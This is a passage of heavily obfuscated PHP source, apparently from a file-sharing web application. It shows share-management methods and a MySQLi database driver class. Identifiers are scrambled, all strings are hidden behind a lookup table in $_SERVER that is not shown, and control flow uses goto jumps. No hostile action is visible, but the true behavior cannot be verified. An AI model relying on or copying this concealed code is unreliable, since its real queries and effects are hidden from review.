$Ä£Å¥µ¥[189] => $•×ÒÎâ¸, $Ä£Å¥µ¥[594] => intval($ÌÌÛ»×Ì[$Ä£Å¥µ¥[594]]), $Ä£Å¥µ¥[1589] => 0, $Ä£Å¥µ¥[2295] => -1); if ($ÌÌÛ»×Ì[$Ä£Å¥µ¥[1589]]) { $‰éÛ¢Ô„[$Ä£Å¥µ¥[1589]] = $ÌÌÛ»×Ì[$Ä£Å¥µ¥[1589]]; } else { if ($ÌÌÛ»×Ì[$Ä£Å¥µ¥[2295]]) { $‰éÛ¢Ô„[$Ä£Å¥µ¥[2295]] = $ÌÌÛ»×Ì[$Ä£Å¥µ¥[2295]]; } } $ËÒÌŞ§[] = $‰éÛ¢Ô„; } return $ÄØ§ÄğÂ->addAll($ËÒÌŞ§, array(), !0); } public function numViewAdd($ÇúŒ–î) { $‡áíÒ˜¦ =& $_SERVER[áäÒ½¯Ç]; $Ú‡ş‰Î¤ = array($‡áíÒ˜¦[2294] => $ÇúŒ–î); $this->where($Ú‡ş‰Î¤)->setAdd($‡áíÒ˜¦[2291]); } public function numDownloadAdd($“˜¤¬Ë) { $‘¢í’ =& $_SERVER[áäÒ½¯Ç]; $¨«£·Ñ° = array($‘¢í’[2294] => $“˜¤¬Ë); $this->where($¨«£·Ñ°)->setAdd($‘¢í’[2292]); } protected function shareEdit($—Şà•íâ, $²ñßŸàš) { $¨ñÃİºÏ =& $_SERVER[áäÒ½¯Ç]; $ÃãüÓ³õ = $this->getInfo($—Şà•íâ); if (!$ÃãüÓ³õ) { return !1; } if ($²ñßŸàš[$¨ñÃİºÏ[1504]] && $²ñßŸàš[$¨ñÃİºÏ[583]] == $¨ñÃİºÏ[91]) { if ($²ñßŸàš[$¨ñÃİºÏ[1504]] == $ÃãüÓ³õ[$¨ñÃİºÏ[1504]]) { unset($²ñßŸàš[$¨ñÃİºÏ[1504]]); } if ($²ñßŸàš[$¨ñÃİºÏ[1504]]) { $’ÏÔ§Ïí = $this->where(array($¨ñÃİºÏ[2296] => $²ñßŸàš[$¨ñÃİºÏ[1504]]))->find(); if ($’ÏÔ§Ïí) { return !1; } if (!is_array($²ñßŸàš[$¨ñÃİºÏ[585]])) { $²ñßŸàš[$¨ñÃİºÏ[585]] = is_array($ÃãüÓ³õ[$¨ñÃİºÏ[585]]) ? $ÃãüÓ³õ[$¨ñÃİºÏ[585]] : array(); } if (!$²ñßŸàš[$¨ñÃİºÏ[585]][$¨ñÃİºÏ[2297]]) { $²ñßŸàš[$¨ñÃİºÏ[585]][$¨ñÃİºÏ[2297]] = $ÃãüÓ³õ[$¨ñÃİºÏ[1504]]; $²ñßŸàš[$¨ñÃİºÏ[585]][$¨ñÃİºÏ[2298]] = $¨ñÃİºÏ[91]; } } } $this->_checkLinkShare($²ñßŸàš, $ÃãüÓ³õ); $ÎûÍ“•û = array(); $î÷¦÷ëÁ = explode($¨ñÃİºÏ[50], $¨ñÃİºÏ[2299]); foreach ($î÷¦÷ëÁ as $İ†ğÉÔĞ) { if (!array_key_exists($İ†ğÉÔĞ, $²ñßŸàš)) { continue; } $ÎûÍ“•û[$İ†ğÉÔĞ] = $²ñßŸàš[$İ†ğÉÔĞ]; } $this->shareEventAdd($ÃãüÓ³õ[$¨ñÃİºÏ[192]], $²ñßŸàš, $¨ñÃİºÏ[1511]); $this->where(array($¨ñÃİºÏ[2294] => $—Şà•íâ))->save($ÎûÍ“•û); if (isset($²ñßŸàš[$¨ñÃİºÏ[2283]])) { $this->_shareAuthSet($—Şà•íâ, $²ñßŸàš[$¨ñÃİºÏ[2283]]); } return !0; } private function _checkLinkShare($ü…Ôë¤‰, $‚¤÷û¢¨) { $¨¨¸°¾¿ =& $_SERVER[áäÒ½¯Ç]; if ($ü…Ôë¤‰[$¨¨¸°¾¿[583]] != $¨¨¸°¾¿[91]) { return; } $¤ÌõÀ¦ = $‚¤÷û¢¨[$¨¨¸°¾¿[90]][$¨¨¸°¾¿[192]]; if ($‚¤÷û¢¨[$¨¨¸°¾¿[90]][$¨¨¸°¾¿[33]] != $¨¨¸°¾¿[241]) { $ü”µ‰‹ = $this->_folderReport($¤ÌõÀ¦); if (!$ü”µ‰‹) { return; } show_json(LNG($¨¨¸°¾¿[2300]) . $¨¨¸°¾¿[2301] . $ü”µ‰‹, !1); } $Òº¨íô® = Model($¨¨¸°¾¿[935])->fileInfoGet($‚¤÷û¢¨[$¨¨¸°¾¿[90]][$¨¨¸°¾¿[192]]); if (!$Òº¨íô®) { return; } $¶Å„“Éê = $this->shareFileMeta($Òº¨íô®[$¨¨¸°¾¿[562]]); if (isset($¶Å„“Éê[$¨¨¸°¾¿[460]]) && $¶Å„“Éê[$¨¨¸°¾¿[460]] == $¨¨¸°¾¿[91]) { show_json(LNG($¨¨¸°¾¿[2302]), !1); } } private function _folderReport($²ÓíÁÓ») { $Îƒ¬¿Çª =& $_SERVER[áäÒ½¯Ç]; $öüÈƒ‰¸ = array($Îƒ¬¿Çª[562] => array($Îƒ¬¿Çª[1128], 0), $Îƒ¬¿Çª[852] => 3); $€¾’¡Ó = Model($Îƒ¬¿Çª[2303])->where($öüÈƒ‰¸)->field($Îƒ¬¿Çª[562])->select(); if (!$€¾’¡Ó) { return !1; } $€¾’¡Ó = array_to_keyvalue($€¾’¡Ó, $Îƒ¬¿Çª[12], $Îƒ¬¿Çª[562]); $ğâ‘­û = $Îƒ¬¿Çª[50] . $²ÓíÁÓ» . $Îƒ¬¿Çª[50]; $öüÈƒ‰¸ = array($Îƒ¬¿Çª[562] => array($Îƒ¬¿Çª[7], $€¾’¡Ó), $Îƒ¬¿Çª[609] => array($Îƒ¬¿Çª[479], "\45{$ğâ‘­û}\x25"), $Îƒ¬¿Çª[525] => 0); $Î»‰—²ş = Model($Îƒ¬¿Çª[935])->where($öüÈƒ‰¸)->field($Îƒ¬¿Çª[2304])->find(); if (!$Î»‰—²ş) { return !1; } $†˜¯óœ = substr($Î»‰—²ş[$Îƒ¬¿Çª[609]], strpos($Î»‰—²ş[$Îƒ¬¿Çª[609]], $ğâ‘­û)); $öüÈƒ‰¸ = array($Îƒ¬¿Çª[192] => array($Îƒ¬¿Çª[7], trim($†˜¯óœ, $Îƒ¬¿Çª[50]))); $Öäşó¥ = Model($Îƒ¬¿Çª[935])->where($öüÈƒ‰¸)->field($Îƒ¬¿Çª[32])->select(); $öµÜ¤Ù¨ = array_to_keyvalue($Öäşó¥, $Îƒ¬¿Çª[12], $Îƒ¬¿Çª[32]); $öµÜ¤Ù¨[] = $Î»‰—²ş[$Îƒ¬¿Çª[32]]; return implode($Îƒ¬¿Çª[8], $öµÜ¤Ù¨); } protected function remove($›Ü•±µ) { $—„ ÆèÌ =& $_SERVER[áäÒ½¯Ç]; $€…ƒ´·é = is_array($›Ü•±µ) ? $›Ü•±µ : array($›Ü•±µ); for ($¿çŞëËÎ = 0; $¿çŞëËÎ < count($€…ƒ´·é); $¿çŞëËÎ++) { $í‡Òôêø = $this->getInfo($€…ƒ´·é[$¿çŞëËÎ]); if ($í‡Òôêø[$—„ ÆèÌ[691]] == $—„ ÆèÌ[91]) { Model($—„ ÆèÌ[661])->eventShare($í‡Òôêø[$—„ ÆèÌ[192]], $—„ ÆèÌ[2289]); } if ($í‡Òôêø[$—„ ÆèÌ[583]] == $—„ ÆèÌ[91]) { Model($—„ ÆèÌ[661])->eventShare($í‡Òôêø[$—„ ÆèÌ[192]], $—„ ÆèÌ[2288]); } } $âÍÀ…Ø = array($—„ ÆèÌ[693] => array($—„ ÆèÌ[7], $€…ƒ´·é)); $†ÒÑÓé„ = $this->where($âÍÀ…Ø)->delete(); if ($†ÒÑÓé„) { Model($—„ ÆèÌ[694])->where($âÍÀ…Ø)->delete(); } return $†ÒÑÓé„; } protected function removeBySource($œœÚøœ×) { $ÓÓ¬Ùì =& $_SERVER[áäÒ½¯Ç]; $«ı—«ó† = array($ÓÓ¬Ùì[511] => array($ÓÓ¬Ùì[512], $œœÚøœ×)); $Šò”ë– = $this->field($ÓÓ¬Ùì[693])->where($«ı—«ó†)->select(); $š‡û§‘ = array_to_keyvalue($Šò”ë–, $ÓÓ¬Ùì[12], $ÓÓ¬Ùì[693]); if (!$š‡û§‘) { return; } foreach ($Šò”ë– as $µ¤­•“Ü) { $this->shareInfoMofify($µ¤­•“Ü, $ÓÓ¬Ùì[2305]); } $«ı—«ó† = array($ÓÓ¬Ùì[2294] => array($ÓÓ¬Ùì[512], $š‡û§‘)); $this->where($«ı—«ó†)->delete(); Model($ÓÓ¬Ùì[694])->where($«ı—«ó†)->delete(); } public function listAll($€ÜÀê£˜) { $Ğµ²˜ó =& $_SERVER[áäÒ½¯Ç]; $ßÎˆ×Ï = array(); if ($€ÜÀê£˜[$Ğµ²˜ó[1542]]) { $ßÎˆ×Ï[$Ğµ²˜ó[1542]] = $€ÜÀê£˜[$Ğµ²˜ó[1542]]; } if ($€ÜÀê£˜[$Ğµ²˜ó[863]]) { $ëÁˆ¤¯ = $€ÜÀê£˜[$Ğµ²˜ó[864]] ? $€ÜÀê£˜[$Ğµ²˜ó[864]] : strtotime(date($Ğµ²˜ó[2306])); $ßÎˆ×Ï[$Ğµ²˜ó[242]] = array($Ğµ²˜ó[418], array($€ÜÀê£˜[$Ğµ²˜ó[863]], $ëÁˆ¤¯)); } if ($€ÜÀê£˜[$Ğµ²˜ó[33]]) { $ßÎˆ×Ï[$€ÜÀê£˜[$Ğµ²˜ó[33]]] = 1; } else { $ßÎˆ×Ï[] = array($Ğµ²˜ó[583] => array($Ğµ²˜ó[1128], 0), $Ğµ²˜ó[691] => array($Ğµ²˜ó[1128], 0), $Ğµ²˜ó[2277] => $Ğµ²˜ó[2233]); } if ($€ÜÀê£˜[$Ğµ²˜ó[2229]]) { $ßÎˆ×Ï[] = array($Ğµ²˜ó[1504] => $€ÜÀê£˜[$Ğµ²˜ó[2229]], $Ğµ²˜ó[1815] => array($Ğµ²˜ó[479], "\x25{$€ÜÀê£˜[$Ğµ²˜ó[2229]]}\x25"), $Ğµ²˜ó[2277] => $Ğµ²˜ó[2233]); } $ø®ºº¸„ = $this->_makeOrder()->where($ßÎˆ×Ï)->selectPage(20); if (empty($ø®ºº¸„[$Ğµ²˜ó[455]])) { return array(); } $this->_listDataApply($ø®ºº¸„[$Ğµ²˜ó[455]]); return $ø®ºº¸„; } public function listDataApply($¿€öìıé) { $this->_listDataApply($¿€öìıé); return $¿€öìıé; } private function _listDataApply(&$‹¦Ÿó¦) { $´ÚÆÏ±ï =& $_SERVER[áäÒ½¯Ç]; $†§“ = array_to_keyvalue($‹¦Ÿó¦, $´ÚÆÏ±ï[12], $´ÚÆÏ±ï[1542]); $ƒş¼şµ˜ = Model($´ÚÆÏ±ï[622])->userListInfo(array_unique($†§“)); $©äµÓÇÚ = array_to_keyvalue($‹¦Ÿó¦, $´ÚÆÏ±ï[12], $´ÚÆÏ±ï[192]); $ùÎ®ñëŞ = Model($´ÚÆÏ±ï[935])->sourceListInfo($©äµÓÇÚ, !0); foreach ($‹¦Ÿó¦ as $Â†å˜’® => &$Ğ¦ôî‰) { $åä²—Š = $Ğ¦ôî‰[$´ÚÆÏ±ï[1542]]; $Ğ¦ôî‰[$´ÚÆÏ±ï[2307]] = $ƒş¼şµ˜[$åä²—Š] ? $ƒş¼şµ˜[$åä²—Š] : !1; if (!$Ğ¦ôî‰[$´ÚÆÏ±ï[2307]] || $Ğ¦ôî‰[$´ÚÆÏ±ï[2307]][$´ÚÆÏ±ï[852]] != $´ÚÆÏ±ï[91]) { unset($‹¦Ÿó¦[$Â†å˜’®]); continue; } $åÆ—Ó¿ù = $Ğ¦ôî‰[$´ÚÆÏ±ï[192]]; $Ğ¦ôî‰[$´ÚÆÏ±ï[90]] = $ùÎ®ñëŞ[$åÆ—Ó¿ù] ? $ùÎ®ñëŞ[$åÆ—Ó¿ù] : !1; if ($Ğ¦ôî‰[$´ÚÆÏ±ï[90]][$´ÚÆÏ±ï[525]] == $´ÚÆÏ±ï[91]) { unset($‹¦Ÿó¦[$Â†å˜’®]); } if ($Ğ¦ôî‰[$´ÚÆÏ±ï[90]] != $´ÚÆÏ±ï[239] && !$Ğ¦ôî‰[$´ÚÆÏ±ï[90]]) { unset($‹¦Ÿó¦[$Â†å˜’®]); } } unset($Ğ¦ôî‰); $‹¦Ÿó¦ = array_values($‹¦Ÿó¦); } private function _makeOrder($âçæğ = '') { $ı„ªÚô =& $_SERVER[áäÒ½¯Ç]; $ú¼ÒïÍ = array($ı„ªÚô[242], $ı„ªÚô[864], $ı„ªÚô[2291], $ı„ªÚô[2292]); $ÍÁÈ’ë¹ = array($ı„ªÚô[542] => $ı„ªÚô[543], $ı„ªÚô[544] => $ı„ªÚô[545]); $Ñ¬áØë§ = Input::get($ı„ªÚô[549], $ı„ªÚô[7], $ı„ªÚô[517], $ú¼ÒïÍ); $»Ğ¦èØ± = Input::get($ı„ªÚô[550], $ı„ªÚô[7], $ı„ªÚô[2308], array($ı„ªÚô[2226], $ı„ªÚô[544])); $»Ğ¦èØ± = $ÍÁÈ’ë¹[$»Ğ¦èØ±]; $âçæğ = $âçæğ . "{$Ñ¬áØë§}\x20{$»Ğ¦èØ±}"; return $this->order($âçæğ); } public function reportAdd($ó»—Ö†Â) { $À±ïŒß˜ =& $_SERVER[áäÒ½¯Ç]; $‡ûü×šÛ = array($À±ïŒß˜[693] => $ó»—Ö†Â[$À±ïŒß˜[693]], $À±ïŒß˜[1542] => USER_ID); if (Model($À±ïŒß˜[2303])->where($‡ûü×šÛ)->find()) { return !1; } $Ğ•“€ˆÜ = array($À±ïŒß˜[693] => $ó»—Ö†Â[$À±ïŒß˜[693]], $À±ïŒß˜[1815] => $ó»—Ö†Â[$À±ïŒß˜[1815]], $À±ïŒß˜[192] => $ó»—Ö†Â[$À±ïŒß˜[192]], $À±ïŒß˜[562] => $ó»—Ö†Â[$À±ïŒß˜[562]], $À±ïŒß˜[1542] => USER_ID, $À±ïŒß˜[33] => $ó»—Ö†Â[$À±ïŒß˜[33]], $À±ïŒß˜[545] => $ó»—Ö†Â[$À±ïŒß˜[545]]); return Model($À±ïŒß˜[2303])->add($Ğ•“€ˆÜ); } public function reportList($¶Ó¨£¿•) { $§¥ÁôÏ =& $_SERVER[áäÒ½¯Ç]; $Ğ“™¿´í = array(); if ($¶Ó¨£¿•[$§¥ÁôÏ[863]]) { $¸ÕÂˆ„„ = $¶Ó¨£¿•[$§¥ÁôÏ[864]] ? $¶Ó¨£¿•[$§¥ÁôÏ[864]] : strtotime(date($§¥ÁôÏ[2306])); $Ğ“™¿´í[$§¥ÁôÏ[242]] = array($§¥ÁôÏ[418], array($¶Ó¨£¿•[$§¥ÁôÏ[863]], $¸ÕÂˆ„„)); } if (isset($¶Ó¨£¿•[$§¥ÁôÏ[33]]) && in_array($¶Ó¨£¿•[$§¥ÁôÏ[33]], array($§¥ÁôÏ[91], $§¥ÁôÏ[529], $§¥ÁôÏ[2309], $§¥ÁôÏ[2310], $§¥ÁôÏ[2311]))) { $Ğ“™¿´í[$§¥ÁôÏ[33]] = $¶Ó¨£¿•[$§¥ÁôÏ[33]]; } if (isset($¶Ó¨£¿•[$§¥ÁôÏ[852]]) && in_array($¶Ó¨£¿•[$§¥ÁôÏ[852]], array($§¥ÁôÏ[239], $§¥ÁôÏ[91], $§¥ÁôÏ[529], $§¥ÁôÏ[2309]))) { $Ğ“™¿´í[$§¥ÁôÏ[852]] = $¶Ó¨£¿•[$§¥ÁôÏ[852]]; } $«şÖûáğ = Input::get($§¥ÁôÏ[550], $§¥ÁôÏ[7], $§¥ÁôÏ[2308], array($§¥ÁôÏ[2226], $§¥ÁôÏ[544])); $ô®æÍº— = array($§¥ÁôÏ[542] => $§¥ÁôÏ[543], $§¥ÁôÏ[544] => $§¥ÁôÏ[545]); $ÀÆæ ½ = $§¥ÁôÏ[2312] . $ô®æÍº—[$«şÖûáğ]; $ƒö÷ã†£ = Model($§¥ÁôÏ[2303])->where($Ğ“™¿´í)->order($ÀÆæ ½)->selectPage(20); if (empty($ƒö÷ã†£[$§¥ÁôÏ[455]])) { return array(); } $ª¨¡…² = array_to_keyvalue_group($ƒö÷ã†£[$§¥ÁôÏ[455]], $§¥ÁôÏ[852], $§¥ÁôÏ[693]); if (!empty($ª¨¡…²[0])) { $¶Ó¨£¿• = $ª¨¡…²[0]; $Ğ“™¿´í = array($§¥ÁôÏ[693] => array($§¥ÁôÏ[7], $¶Ó¨£¿•)); $Ş†Ë‚û = $this->where($Ğ“™¿´í)->field($§¥ÁôÏ[693])->select(); $Ş†Ë‚û = array_to_keyvalue($Ş†Ë‚û, $§¥ÁôÏ[12], $§¥ÁôÏ[693]); $Â×‡å½Ì = array_diff($¶Ó¨£¿•, $Ş†Ë‚û); if (!empty($Â×‡å½Ì)) { foreach ($ƒö÷ã†£[$§¥ÁôÏ[455]] as $¦¨ş¢ã => $ÇŒ¶¸Ø) { if (in_array($ÇŒ¶¸Ø[$§¥ÁôÏ[693]], $Â×‡å½Ì)) { unset($ƒö÷ã†£[$§¥ÁôÏ[455]][$¦¨ş¢ã]); } } } } $this->_listDataApply($ƒö÷ã†£[$§¥ÁôÏ[455]]); return $ƒö÷ã†£; } public function reportStatus($¾íˆùª¢) { $“ÉÚ™»Ï =& $_SERVER[áäÒ½¯Ç]; $Ó¶¸Ôå = array($“ÉÚ™»Ï[492] => $¾íˆùª¢[$“ÉÚ™»Ï[492]]); $¾Ã¡³ = Model($“ÉÚ™»Ï[2303])->where($Ó¶¸Ôå)->field($“ÉÚ™»Ï[2313])->find(); if (!$¾Ã¡³) { return !1; } $Ö…„â¬ = array($“ÉÚ™»Ï[852] => $¾íˆùª¢[$“ÉÚ™»Ï[852]]); if ($¾íˆùª¢[$“ÉÚ™»Ï[852]] == $“ÉÚ™»Ï[2309] && $¾Ã¡³[$“ÉÚ™»Ï[852]] == $“ÉÚ™»Ï[2309]) { $Ö…„â¬[$“ÉÚ™»Ï[852]] = 0; } $é˜ĞŞ‰ = Model($“ÉÚ™»Ï[2303])->where($Ó¶¸Ôå)->save($Ö…„â¬); if ($¾íˆùª¢[$“ÉÚ™»Ï[852]] == $“ÉÚ™»Ï[529]) { if ($¾Ã¡³[$“ÉÚ™»Ï[562]] != $“ÉÚ™»Ï[239] && $this->shareFileMeta($¾Ã¡³[$“ÉÚ™»Ï[562]])) { $this->shareFileMeta($¾Ã¡³[$“ÉÚ™»Ï[562]], 0); } $this->remove($¾Ã¡³[$“ÉÚ™»Ï[693]]); return !0; } if ($é˜ĞŞ‰ && $¾íˆùª¢[$“ÉÚ™»Ï[852]] == $“ÉÚ™»Ï[2309]) { $ñ÷ëÈşí = $Ö…„â¬[$“ÉÚ™»Ï[852]] == $“ÉÚ™»Ï[2309] ? 1 : 0; $this->shareFileMeta($¾Ã¡³[$“ÉÚ™»Ï[562]], $ñ÷ëÈşí); $this->removeByFile($¾Ã¡³[$“ÉÚ™»Ï[562]]); } return $é˜ĞŞ‰; } private function removeByFile($©ú±Î‰½) { $ÄæÒìÙ =& $_SERVER[áäÒ½¯Ç]; $÷ü»£İÊ = Model($ÄæÒìÙ[935])->where(array($ÄæÒìÙ[562] => $©ú±Î‰½))->field($ÄæÒìÙ[192])->select(); $Öõ¼‡¹ = array_to_keyvalue($÷ü»£İÊ, $ÄæÒìÙ[12], $ÄæÒìÙ[192]); $¯¯ ¸Š = array($ÄæÒìÙ[192] => array($ÄæÒìÙ[7], $Öõ¼‡¹), $ÄæÒìÙ[583] => 1); $÷ü»£İÊ = $this->where($¯¯ ¸Š)->field($ÄæÒìÙ[693])->select(); if (empty($÷ü»£İÊ)) { return; } $îÂõü = array_to_keyvalue($÷ü»£İÊ, $ÄæÒìÙ[12], $ÄæÒìÙ[693]); $this->remove($îÂõü); } private function shareFileMeta($†¾ÁÃé³, $‘ãğí¿˜ = null) { $Ö¦ñ´äÑ =& $_SERVER[áäÒ½¯Ç]; $¯¹Íãæ÷ = array($Ö¦ñ´äÑ[562] => $†¾ÁÃé³, $Ö¦ñ´äÑ[95] => $Ö¦ñ´äÑ[2314]); if (is_null($‘ãğí¿˜)) { return Model($Ö¦ñ´äÑ[2315])->where($¯¹Íãæ÷)->find(); } $¯¹Íãæ÷[$Ö¦ñ´äÑ[460]] = $‘ãğí¿˜; Model($Ö¦ñ´äÑ[2315])->add($¯¹Íãæ÷, array(), !0); } } goto fÂ‘àœÍÓ; F¢ˆéŞ‹Ö: class DbMysqli extends Db { public function __construct($ÌñÖ¬ÊÊ = '') { $ğÀËÑ³á =& $_SERVER[áäÒ½¯Ç]; if (!extension_loaded($ğÀËÑ³á[1028])) { think_exception(think_lang($ğÀËÑ³á[14]) . $ğÀËÑ³á[1029]); } if (!empty($ÌñÖ¬ÊÊ)) { $this->config = $ÌñÖ¬ÊÊ; if (empty($this->config[$ğÀËÑ³á[17]])) { $this->config[$ğÀËÑ³á[17]] = $ğÀËÑ³á[12]; } } } public function connect($õ¦ÉğãÖ = '', $ŠÔ³Ù¿è = 0) { $ü÷Çîß =& $_SERVER[áäÒ½¯Ç]; if (!isset($this->linkID[$ŠÔ³Ù¿è])) { if (empty($õ¦ÉğãÖ)) { $õ¦ÉğãÖ = $this->config; } $this->linkID[$ŠÔ³Ù¿è] = new mysqli($õ¦ÉğãÖ[$ü÷Çîß[999]], $õ¦ÉğãÖ[$ü÷Çîß[1001]], $õ¦ÉğãÖ[$ü÷Çîß[1002]], $õ¦ÉğãÖ[$ü÷Çîß[21]], $õ¦ÉğãÖ[$ü÷Çîß[1000]] ? intval($õ¦ÉğãÖ[$ü÷Çîß[1000]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $×›ï…ìä = $this->linkID[$ŠÔ³Ù¿è]->server_version; $this->linkID[$ŠÔ³Ù¿è]->query($ü÷Çîß[1003] . think_config($ü÷Çîß[1004]) . $ü÷Çîß[58]); if ($×›ï…ìä > $ü÷Çîß[1005]) { $this->linkID[$ŠÔ³Ù¿è]->query($ü÷Çîß[1006]); } $this->connected = !0; if (1 != think_config($ü÷Çîß[22])) { unset($this->config); } } return $this->linkID[$ŠÔ³Ù¿è]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ƒ†‡÷´ü) { $÷ˆêì’¨ =& $_SERVER[áäÒ½¯Ç]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ƒ†‡÷´ü; if ($this->queryID) { $this->free(); } think_action_status($÷ˆêì’¨[23], 1); think_status($÷ˆêì’¨[24]); $this->queryID = $this->_linkID->query($ƒ†‡÷´ü); if ($this->_linkID->more_results()) { while (($÷Î²¼Ù÷ = $this->_linkID->next_result()) != NULL) { $÷Î²¼Ù÷->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($êŠÀıÅÑ) { $Æ€¢ƒî =& $_SERVER[áäÒ½¯Ç]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $êŠÀıÅÑ; if ($this->queryID) { $this->free(); } think_action_status($Æ€¢ƒî[25], 1); think_status($Æ€¢ƒî[24]); $ëç¥€° = $this->_linkID->query($êŠÀıÅÑ); $this->debug(); if (!1 === $ëç¥€°) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¦óÚª“­ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$¦óÚª“­) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $óìÇ‘Â§ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$óìÇ‘Â§) { $this->error(); return !1; } } return !0; } private function getAll() { $ÖóâŠˆ = array(); if ($this->numRows > 0) { for ($ª­›šæ‡ = 0; $ª­›šæ‡ < $this->numRows; $ª­›šæ‡++) { $ÖóâŠˆ[$ª­›šæ‡] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ÖóâŠˆ; } public function getFields($» ìÓÕú) { $ÛÍÉãõØ =& $_SERVER[áäÒ½¯Ç]; $Ôğ³ö•é = $this->query($ÛÍÉãõØ[1010] . $this->parseKey($» ìÓÕú)); $°ô÷®ô¥ = array(); if ($Ôğ³ö•é) { foreach ($Ôğ³ö•é as $ø£—¬¬ => $ò«ù•”) { $°ô÷®ô¥[$ò«ù•”[$ÛÍÉãõØ[31]]] = array($ÛÍÉãõØ[32] => $ò«ù•”[$ÛÍÉãõØ[31]], $ÛÍÉãõØ[33] => $ò«ù•”[$ÛÍÉãõØ[34]], $ÛÍÉãõØ[35] => (bool) ($ò«ù•”[$ÛÍÉãõØ[36]] === $ÛÍÉãõØ[12]), $ÛÍÉãõØ[37] => $ò«ù•”[$ÛÍÉãõØ[38]], $ÛÍÉãõØ[39] => strtolower($ò«ù•”[$ÛÍÉãõØ[40]]) == $ÛÍÉãõØ[41], $ÛÍÉãõØ[42] => strtolower($ò«ù•”[$ÛÍÉãõØ[43]]) == $ÛÍÉãõØ[44]); } } return $°ô÷®ô¥; } public function getTables($çÄÕìê„ = '') { $ßŞß››å =& $_SERVER[áäÒ½¯Ç]; $–å¯ÅôÁ = !empty($çÄÕìê„) ? $ßŞß››å[1012] . $çÄÕìê„ . $ßŞß››å[1013] : $ßŞß››å[1014]; $õ«µïÍÊ = $this->query($–å¯ÅôÁ); $¢É·İÉ§ = array(); if ($õ«µïÍÊ) { foreach ($õ«µïÍÊ as $Û³Ñı²š => $¶ºé–Åü) { $¢É·İÉ§[$Û³Ñı²š] = current($¶ºé–Åü); } } return $¢É·İÉ§; } public function replace($Šá…÷Œş, $ï¥¼îò = array()) { $Äå·Ú¤Ã =& $_SERVER[áäÒ½¯Ç]; foreach ($Šá…÷Œş as $šÎ§Ÿ³Š => $µ·¡Òªò) { $¯öÂ—èö = $this->parseValue($µ·¡Òªò); if (is_scalar($¯öÂ—èö)) { $´¾«éœ[] = $¯öÂ—èö; $Èú§àŸÇ[] = $this->parseKey($šÎ§Ÿ³Š); } } $®Ö¢–Ô = $Äå·Ú¤Ã[1015] . $this->parseTable($ï¥¼îò[$Äå·Ú¤Ã[367]]) . $Äå·Ú¤Ã[1016] . implode($Äå·Ú¤Ã[50], $Èú§àŸÇ) . $Äå·Ú¤Ã[1017] . implode($Äå·Ú¤Ã[50], $´¾«éœ) . $Äå·Ú¤Ã[1018]; return $this->execute($®Ö¢–Ô); } public function insertAll($¦Õ±“áò, $ä‚ğ¢“ = array(), $¸ñğå»¢ = false) { $ŒÆ¿çò =& $_SERVER[áäÒ½¯Ç]; if (!is_array($¦Õ±“áò[0])) { return !1; } $øò½Ÿí¯ = array_keys($¦Õ±“áò[0]); $Œ©ñ€½ = array(); foreach ($¦Õ±“áò as $ìñ£Ÿ­) { $œÔÔ€¬Ô = array(); foreach ($ìñ£Ÿ­ as $ªƒ‘Ç† => $•İßÙÊ°) { $•İßÙÊ° = $this->parseValue($•İßÙÊ°); if (is_scalar($•İßÙÊ°)) { $œÔÔ€¬Ô[] = $•İßÙÊ°; } } $Œ©ñ€½[] = $ŒÆ¿çò[347] . implode($ŒÆ¿çò[50], $œÔÔ€¬Ô) . $ŒÆ¿çò[1018]; } array_walk($øò½Ÿí¯, array($this, $ŒÆ¿çò[1019])); $•şç…•Â = $¸ñğå»¢ ? $ŒÆ¿çò[1020] : $ŒÆ¿çò[1021]; $•şç…•Â = $ŒÆ¿çò[1021]; $ÉÅ¡õ‘é = $•şç…•Â . $ŒÆ¿çò[1022] . $this->parseTable($ä‚ğ¢“[$ŒÆ¿çò[367]]) . $ŒÆ¿çò[1016] . implode($ŒÆ¿çò[50], $øò½Ÿí¯) . $ŒÆ¿çò[1023] . implode($ŒÆ¿çò[50], $Œ©ñ€½); if ($¸ñğå»¢) { $šÙé¿óÅ = array(); foreach ($øò½Ÿí¯ as $ªƒ‘Ç†) { if ($ªƒ‘Ç† == $ŒÆ¿çò[242] || $ªƒ‘Ç† == $ŒÆ¿çò[1024]) { continue; } $šÙé¿óÅ[] = $ªƒ‘Ç† . $ŒÆ¿çò[1025] . $ªƒ‘Ç† . $ŒÆ¿çò[1018]; } $ÉÅ¡õ‘é .= $ŒÆ¿çò[1026] . implode($ŒÆ¿çò[50], $šÙé¿óÅ); } return $this->execute($ÉÅ¡õ‘é); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $“ïİàÅ =& $_SERVER[áäÒ½¯Ç]; $this->error = $this->_linkID->errno . $“ïİàÅ[4] . $this->_linkID->error; if ($“ïİàÅ[12] != $this->queryStr) { $this->error .= LNG($“ïİàÅ[48]) . $this->queryStr; } think_trace($this->error, $“ïİàÅ[12], $“ïİàÅ[49]); return $this->error; } public function escapeString($§¿°ïä) { if ($this->_linkID) { return $this->_linkID->real_escape_string($§¿°ïä); } else { return addslashes($§¿°ïä); } } public function parseKey(&$¥ï«í„’, $´®ãœö = true) { $¹”ºšá =& $_SERVER[áäÒ½¯Ç]; if ($´®ãœö) { $¥ï«í„’ = $this->parseKeyCheck($¥ï«í„’); } if ($¥ï«í„’ != $¹”ºšá[231] && !preg_match($¹”ºšá[1027], $¥ï«í„’)) { $¥ï«í„’ = $¹”ºšá[481] . trim($¥ï«í„’, $¹”ºšá[481]) . $¹”ºšá[481]; } return $¥ï«í„’; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ˆ¬¡ÂÆİ = '') { $ı’üß–ê =& 